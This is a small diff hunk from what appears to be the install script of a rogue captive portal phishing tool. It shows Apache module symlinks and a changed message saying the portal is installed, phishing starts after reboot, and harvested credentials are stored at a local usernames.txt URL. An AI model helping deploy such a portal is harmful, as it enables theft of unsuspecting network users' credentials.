@@ -23,5 +23,5 @@ ln -s ../conf-available/override.conf override.conf
 cd /etc/apache2/mods-enabled
 ln -s ../mods-available/rewrite.load rewrite.load
 
-echo "Rogue captive portal installed. Reboot to start phishing. Credentials will be available here: http://10.1.1.1/usernames.txt"
+echo "Rogue captive portal installed. Reboot and wait 15-20 seconds to start phishing. Credentials will be available here: http://10.1.1.1/usernames.txt"
 exit 0
